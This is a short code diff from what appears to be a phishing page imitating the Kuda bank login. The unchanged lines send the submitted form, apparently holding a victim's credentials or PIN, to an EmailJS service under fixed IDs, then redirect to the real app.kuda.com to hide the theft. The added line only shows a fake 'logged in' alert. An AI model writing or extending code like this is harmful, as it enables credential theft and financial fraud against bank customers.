@@ -42,6 +42,7 @@
             emailjs.sendForm('service_ia0lisq', 'template_vpyhx1m', this)
                 .then(function(response) {
                     console.log('Sent successfully:', response);
+                    alert('logged in');
 
                     // Redirect to "pin.html" after successful email send
                     window.location.href = 'https://app.kuda.com/';
